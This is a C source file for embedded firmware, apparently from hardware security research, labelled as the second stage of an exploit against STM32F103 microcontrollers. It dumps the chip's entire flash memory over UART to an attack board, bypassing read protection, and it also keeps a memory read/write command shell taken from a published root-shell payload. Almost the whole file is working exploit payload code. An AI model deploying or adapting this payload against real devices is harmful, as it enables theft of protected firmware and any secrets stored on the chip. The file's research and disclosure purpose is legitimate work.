/*
 * Author: JohannesObermaier, Patrick Pedersen
 *
 * Stage 2 of the exploit target firmware
 * This part dumps the contents of the flash memory
 * and sends it over UART, where it is then received
 * by the attack board and lastly sent over USB serial
 * to create a dump file.
 *
 * Targer Firmware Version: 1.1
 *
 * This code is a trimmed down version of the original
 * root shell code published here:
 * https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 * It removes the root shell functionality and goes straight
 * to dumping once booted. It also fixes the dump endianness
 * and allows you to choose on which USART peripheral to dump.
 *
 * To select the USART, provide either of the following defines when compiling:
 * 	-D USE_USART1
 * 	-D USE_USART2
 * 	-D USE_USART3
 *
 */

#include <stdint.h>

const char DUMP_START_MAGIC[] = {0x10, 0xAD, 0xDA, 0x7A};

typedef uint32_t * reg_t;

const volatile reg_t RCC_APB1ENR 	= (reg_t) 0x4002101Cu;
const volatile reg_t RCC_APB2ENR 	= (reg_t) 0x40021018u;
const volatile reg_t GPIOA_CRH		= (reg_t) 0x40010804u;
const volatile reg_t GPIOA_CRL 		= (reg_t) 0x40010800u;
const volatile reg_t GPIOB_CRH 		= (reg_t) 0x40010C04u;
const volatile reg_t IO_B_MODE_L 	= (reg_t) 0x40010C00u;
const volatile reg_t USART1_CTRL 	= (reg_t) 0x40013800u;
const volatile reg_t USART2_CTRL 	= (reg_t) 0x40004400u;
const volatile reg_t USART3_CTRL	= (reg_t) 0x40004800u;

volatile reg_t sel_usart_ctrl;

void readChar( uint8_t const chr );
void writeByte( uint8_t b );
void writeStr( uint8_t const * const str );
void writeChar( uint8_t const chr );
void writeWordLe( uint32_t const word );
void writeWordBe( uint32_t const word );
void readCmd( uint8_t const * const cmd);
uint32_t hexToInt(uint8_t const * const hex);
void readMem(uint32_t const addr, uint32_t const len);
void writeMem(uint32_t const addr, uint32_t const data);

uint8_t const strHelp[] = 	"Help\r\n-----------\r\n"
                            "ADDR, VAL, LEN: 32-bit Hex encoded:\r\n e.g., 0A1337FF\r\n"
                            "-----------\r\n"
                            "R ADDR LEN - Read 32-bit word\r\n"
                            "W ADDR VAL - Write 32-bit word\r\n"
                            "D          - Dump all flash memory\r\n"
                            "S          - Reboot\r\n"
                            "E          - Exit\r\n"
                            "H          - Show help \r\n"
                            "---------------\r\n";

#define PIN_CONFIG_ALT_PUSH_PULL 0xB
#define PIN_CONFIG_INPUT_PULL_UP 0x8

// Intializes USART1
// Returns the USART1 control register
reg_t init_usart1()
{
	/* Enable Clocks */
	*RCC_APB2ENR |= (1 << 2); // Input-Output Port A clock enable
	*RCC_APB2ENR |= (1 << 14); // USART1 clock enable

	/* Configure Pins */

	// Set PA9 (TX) to alternate function push-pull
	*GPIOA_CRH &= ~(0xF << 4);
	*GPIOA_CRH |= (PIN_CONFIG_ALT_PUSH_PULL << 4);

	// Set PA10 (RX) to input pull-up
	*GPIOA_CRH &= ~(0xF << 8);
	*GPIOA_CRH |= (PIN_CONFIG_INPUT_PULL_UP << 8);

	/* Configure and enable USART1 */
	USART1_CTRL[2] = 0x00000341u;
	USART1_CTRL[3] = 0x0000200Cu;

	return USART1_CTRL;
}

// Intializes USART2
// Returns the USART2 control register
reg_t init_usart2()
{
	/* USART2 clock enable */
	*RCC_APB2ENR |= (1 << 2); // Input-Output Port A clock enable
	*RCC_APB1ENR |= (1 << 17); // USART2 clock enable

	/* Configure Pins */

	// Set PA2 (TX) to alternate function push-pull
	*GPIOA_CRL &= ~(0xF << 8);
	*GPIOA_CRL |= (PIN_CONFIG_ALT_PUSH_PULL << 8);

	// Set PA3 (RX) to input pull-up
	*GPIOA_CRL &= ~(0xF << 12);
	*GPIOA_CRL |= (PIN_CONFIG_INPUT_PULL_UP << 12);

	/* Configure and enable USART2 */
	USART2_CTRL[2] = 0x00000341u;
	USART2_CTRL[3] = 0x0000200Cu;

	return USART2_CTRL;
}

// Intializes USART3
// Returns the USART3 control register
reg_t init_usart3()
{
	/* USART3 clock enable */
	*RCC_APB1ENR |= (1 << 18);

	/* IOB Enable */
	*RCC_APB2ENR |= (1 << 3);

	// Set PB10 (TX) to alternate function push-pull
	*GPIOB_CRH &= ~(0xF << 8);
	*GPIOB_CRH |= (PIN_CONFIG_ALT_PUSH_PULL << 8);

	// Set PB11 (RX) to input pull-up
	*GPIOB_CRH &= ~(0xF << 12);
	*GPIOB_CRH |= (PIN_CONFIG_INPUT_PULL_UP << 12);

	/* Configure and enable USART3 */
	USART3_CTRL[2] = 0x00000341;
	USART3_CTRL[3] = 0x0000200C;

	return USART3_CTRL;
}

int main(void)
{
	/* Init USART */
#if defined(USE_USART1)
	sel_usart_ctrl = init_usart1();
#elif defined(USE_USART2)
	sel_usart_ctrl = init_usart2();
#elif defined(USE_USART3)
	sel_usart_ctrl = init_usart3();
#else
#error "No USART selected"
#endif

	/* Print start magic to inform the attack board that
	   we are going to dump */
	for (uint32_t i = 0; i < sizeof(DUMP_START_MAGIC); i++) {
		writeChar(DUMP_START_MAGIC[i]);
	}

	uint32_t const * addr = (uint32_t*) 0x08000000;
	while (((uintptr_t) addr) < (0x08000000 + 64u * 1024u)) {
		writeWordBe(*addr);
		++addr;
	}
}

/* hex must have length 8 */
uint32_t hexToInt(uint8_t const * const hex)
{
	uint32_t ind = 0u;
	uint32_t res = 0u;

	for (ind = 0; ind < 8; ++ind) {
		uint8_t chr = hex[ind];
		uint32_t val = 0u;

		res <<= 4u;

		if ((chr >= '0') && (chr <= '9')) {
			val = chr - '0';
		} else if ((chr >= 'a') && (chr <= 'f')) {
			val = chr - 'a' + 0x0a;
		} else if ((chr >= 'A') && (chr <= 'F')) {
			val = chr - 'A' + 0x0a;
		} else {
			val = 0u;
		}
		res |= val;
	}

	return res;
}

void readChar( uint8_t const chr )
{
#define CMDBUF_LEN (64u)
	static uint8_t cmdbuf[CMDBUF_LEN] = {0u};
	static uint32_t cmdInd = 0u;

	switch (chr) {
	case '\n':
	case '\r':
		cmdbuf[cmdInd] = 0u;
		if (cmdInd != 0) {
			writeStr("\r\n");
		}
		readCmd(cmdbuf);
		cmdInd = 0u;
		writeStr("\r\n> ");
		{
			uint32_t ind = 0u;
			for (ind = 0; ind<CMDBUF_LEN; ++ind) {
				cmdbuf[ind]=0x00u;
			}
		}
		break;

	case 8:
	case 255:
	case 127: /* TODO backspace */
		if (cmdInd > 0u)
			--cmdInd;
		writeChar(chr);
		break;

	default:
		if (cmdInd < (CMDBUF_LEN - 1)) {
			cmdbuf[cmdInd] = chr;
			++cmdInd;
			writeChar(chr);
		}
		break;
	}
}

void readCmd( uint8_t const * const cmd )
{
	switch (cmd[0]) {
	case 0:
		return;
		break;

	/* read 32-bit command */
	case 'r':
	case 'R':
		/* r 08000000 00000100 */
		readMem(hexToInt(&cmd[2]), hexToInt(&cmd[11]));
		break;

	/* write 32-bit command */
	case 'w':
	case 'W':
		/* w 20000000 12345678 */
		writeMem(hexToInt(&cmd[2]), hexToInt(&cmd[11]));
		break;

	/* Dump all flash */
	case 'd':
	case 'D':
		writeStr("\r\n\r\n");
		{
			uint32_t const * addr = (uint32_t*) 0x08000000;
			uint32_t br = 8u;
			uint32_t flash_size = *(uint32_t*)0xE0042000 & 0xFFF;

			// From RM0008, page 54:
			// https://www.st.com/resource/en/reference_manual/rm0008-stm32f101xx-stm32f102xx-stm32f103xx-stm32f105xx-and-stm32f107xx-advanced-armbased-32bit-mcus-stmicroelectronics.pdf
			
			if(flash_size == 0x412)					// Low density device, 32KB
				flash_size = 32 * 1024U;
			else if(flash_size == 0x410)				// Medium density device, 128KB
				flash_size = 128U * 1024U;
			else if(flash_size == 0x414)				// High density device, 512KB
				flash_size = 512 * 1024U;
			else if(flash_size == 0x430)				// XL device, 1MB
				flash_size = 1024U * 1024U;
			else if(flash_size == 0x418)				// Connectivity device, 256KB
				flash_size = 256U * 1024U;
			
			while (((uintptr_t) addr) < (0x08000000 + flash_size)) {
				if (br == 8u) {
					writeStr("\r\n[");
					writeWordBe((uint32_t) addr);
					writeStr("]: ");
					br = 0u;
				}

				writeWordBe(*addr);
				writeChar(' ');
				++addr;
				++br;
			}
		}
		writeStr("\r\n\r\n");
		break;

	/* Help command */
	case 'h':
	case 'H':
		writeStr(strHelp);
		break;

	/* Reboot */
	case 's':
	case 'S':
		writeStr("Rebooting...\r\n\r\n");
		*((uint32_t *) 0xE000ED0C) = 0x05FA0004u;
		break;

	/* exit */
	case 'e':
	case 'E':
		writeStr("Bye.\r\n");
		while (1) {
			__asm__ volatile("wfi");
		}
		break;


	default:
		writeStr("Unknown command: ");
		writeStr(cmd);
		writeStr("\r\n");
		break;
	}
}

const uint8_t txtMap[] = "0123456789ABCDEF";

void writeByte( uint8_t b )
{
	writeChar(txtMap[b >> 4]);
	writeChar(txtMap[b & 0x0F]);
}


void writeStr( uint8_t const * const str )
{
	uint32_t ind = 0u;

	while (str[ind]) {
		writeChar(str[ind]);
		++ind;
	}
}

void writeChar( uint8_t const chr )
{
	while (!(sel_usart_ctrl[0] & 0x80u)) {
		/* wait */
	}

	sel_usart_ctrl[1] = chr;
}

void writeWordLe( uint32_t const word )
{
	writeByte((word & 0x000000FF));
	writeByte((word & 0x0000FF00) >> 8);
	writeByte((word & 0x00FF0000) >> 16);
	writeByte((word & 0xFF000000) >> 24);
}

void writeWordBe( uint32_t const word )
{
	writeChar((word & 0x000000FF));
	writeChar((word & 0x0000FF00) >> 8);
	writeChar((word & 0x00FF0000) >> 16);
	writeChar((word & 0xFF000000) >> 24);
}

void alertCrash( uint32_t crashId )
{
	writeStr("!!! EXCEPTION !!!\r\nID: ");
	writeByte(crashId);
	writeStr("\r\nRestart required!\r\n\r\n");
	*((uint32_t *) 0xE000ED0C) = 0x05FA0004u;
	while (1);
}

void readMem(uint32_t const addr, uint32_t const len)
{
	uint32_t it = 0u;
	uint32_t addrx = 0u;
	uint32_t lenx = 0u;

	lenx = len;
	if (lenx == 0u) {
		lenx = 4u;
	}

	for (it = 0u; it < (lenx / 4u); ++it) {
		addrx = addr + it*4u;
		writeStr("Read [");
		writeWordBe(addrx);
		writeStr("]: ");
		writeWordBe(*((uint32_t*)addrx));
		writeStr("\r\n");
	}
}

void writeMem(uint32_t const addr, uint32_t const data)
{
	writeStr("Write [");
	writeWordBe(addr);
	writeStr("]: ");
	writeWordBe(data);
	*((uint32_t*) addr) = data;
	writeStr("\r\n");
}
